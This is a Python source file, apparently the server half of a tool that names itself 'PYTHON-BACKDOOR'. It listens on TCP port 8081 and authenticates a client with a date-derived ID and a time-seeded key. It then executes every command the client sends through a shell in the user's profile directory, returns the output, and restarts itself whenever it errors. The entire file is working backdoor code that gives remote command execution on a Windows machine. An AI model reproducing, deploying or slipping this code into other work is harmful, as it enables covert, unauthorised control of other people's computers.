import socket
import subprocess
from datetime import datetime
import os
from clipboard import copy
import time
import shutil
import sys
from random import randint
from key_generator.key_generator import generate
import time

curdir = os.path.dirname(os.path.realpath(__file__)).replace('\\','/')+'/'
usp = os.environ['USERPROFILE'].replace('\\','/')+'/'

print('[s] Logging PID ...')
open(curdir+'PID.txt', 'a', encoding='utf-8').write(str(os.getpid())+'\n')
print('[s] PID Logged')
host = ''
port = 8081

def keygen(numseed):
    dmy = datetime.now().day+datetime.now().month+datetime.now().year
    time = datetime.now().hour+datetime.now().minute
    timeseed = dmy+time
    key = generate(num_of_atom=1, separator='', min_atom_len=24, max_atom_len=24, type_of_value='hex', capital='mix', extras=['!','@','#','%','^','&','*','_','-','+','?'], seed=numseed+timeseed).get_key()
    return key

def main():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            print('[s] Server Starting ..', end='', flush=True)
            while True: 
                try:
                    s.bind((host, port))
                    break
                except OSError:
                    print('.', end='', flush=True)
                    time.sleep(0.5)
            print('.')
            print('[s] Server started')
            print('[s] Listening for incoming connection request ...')
            s.listen(1)
            conn, addr = s.accept()
            print('[s] %s:%d connected to the server, logging ...'%addr)
            open(curdir+'conn.txt', 'a', encoding='utf-8').write('%s-%s-%s %s : %s\n' % (datetime.now().day,datetime.now().month,datetime.now().year,datetime.now().strftime('%H:%M:%S'),str(addr)))
            recvid = conn.recv(1024).decode()
            while recvid != ('PYTHON-BACKDOOR-CLIENT'+str(datetime.now().day*6+datetime.now().month*5+datetime.now().year*4+datetime.now().hour*3+datetime.now().minute*2)):
                print('[s] ID verification error, logging ...')
                open(curdir+'conn.txt', 'a', encoding='utf-8').write('%s-%s-%s %s : %s ID verification error, recived ID : %s\n' % (datetime.now().day,datetime.now().month,datetime.now().year,datetime.now().strftime('%H:%M:%S'),str(addr),recvid))
                print('[s] Listening for incoming connection request ...')
                s.listen(1)
                conn, addr = s.accept()
                print('[s] %s:%d connected to the server, logging ...'%addr)
                open(curdir+'conn.txt', 'a', encoding='utf-8').write('%s-%s-%s %s : %s\n' % (datetime.now().day,datetime.now().month,datetime.now().year,datetime.now().strftime('%H:%M:%S'),str(addr)))
                recvid = conn.recv(1024).decode()
            conn.send(('PYTHON-BACKDOOR-SERVER'+str(datetime.now().day*6+datetime.now().month*5+datetime.now().year*4+datetime.now().hour*3+datetime.now().minute*2)).encode())
            
            try:
                while True:
                    numseed = randint(10000,999999)
                    key = keygen(numseed)
                    conn.send(str(numseed).encode())
                    print('[s] Waiting for authentication key ...')
                    recvkey = conn.recv(1024).decode()
                    if key != recvkey:
                        conn.send('KEYAUTHERR'.encode())
                        print('[s] Key authentication error, logging ...')
                        open(curdir+'conn.txt', 'a', encoding='utf-8').write('%s-%s-%s %s : %s Key authentication error, recived Key : %s, expected key : %s\n' % (datetime.now().day,datetime.now().month,datetime.now().year,datetime.now().strftime('%H:%M:%S'),str(addr),recvkey,key))
                    else:
                        conn.send('KEYAUTHSUC'.encode())
                        print('[s] Authentication key accepted')
                        break

                conn.send(usp.encode())
                path = usp

                while True:
                    print('[s] Awaiting commands...')
                    command = conn.recv(1024).decode()
                    print('[s] Command recived : '+command)
                    cmds = command.split(' ')
                    opath = path
                    if cmds[0] == 'cd':
                        if len(cmds) != 1:
                            if cmds[1] == '..' or cmds[1] == '..\\' or cmds[1] == '../':
                                path = '/'.join(path.split('/')[:-2])+'/'
                            else:
                                try:
                                    if cmds[1][1] == ':':
                                        path = cmds[1].replace('\\','/')+'/'
                                    else:
                                        path += cmds[1]+'/'
                                except IndexError:
                                    path += '?'
                            command = 'cd ../'
                    elif command == 'exit' or command == 'quit':
                        conn.send('DISCONNECTENDOFTRANSMISSION'.encode())
                        print('[s] Disconnected from client successfully.')
                        break
                    path = path.replace('//', '/')
                    if path != '/':
                        if os.path.isdir(path):
                            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, cwd=path)
                            output = op.stdout.read()
                            output_error = op.stderr.read()
                        else:
                            path = opath
                            output = ''.encode()
                            output_error = 'The system cannot find the path specified.\n'.encode()
                    else:
                        path = opath
                        output = ''.encode()
                        output_error = ''.encode()
                    print('[s] Logging response ...')
                    open(curdir+'response.txt', 'a', encoding='utf-8').write('%s-%s-%s %s : %s\noutput :\n%s' 
                        % (datetime.now().day,datetime.now().month,datetime.now().year,datetime.now().strftime('%H:%M:%S'),command,(output+output_error).decode()))
                    print('[s] Sending response ...')
                    conn.send(output+output_error+'ENDOFTRANSMISSION'.encode())
                    print('[s] Response sent')
                    conn.send(path.encode())
            except ConnectionAbortedError:
                print('[s] Connection aborted by client')
    except:
        logerror()

def logerror(double = False):
    add = ''
    if double == True:
        add = ' [catched outside main]'
    print('[s] Error catched : ' + str(sys.exc_info()[0])[8:-2] + add)
    print('[s] Logging error ...')
    open(curdir+'error.txt', 'a', encoding='utf-8').write('%s-%s-%s %s : %s%s\n' % (datetime.now().day,datetime.now().month,datetime.now().year,datetime.now().strftime('%H:%M:%S'),str(sys.exc_info()[0])[8:-2],add))
    print('[s] Error logged')

def delpidlog():
    print('[s] Deleting PID from log ...')
    shutil.copy(curdir+'PID.txt', curdir+'PIDt.txt')
    with open(curdir+'PIDt.txt', 'r') as fin:
        with open(curdir+'PID.txt', 'w') as fout:
            for line in fin:
                fout.write(line.replace(str(os.getpid())+'\n', ''))
    os.remove(curdir+'PIDt.txt')
    print('[s] PID deleted from log')

while True:
    try:
        main()
    except:
        logerror(True)
        main()
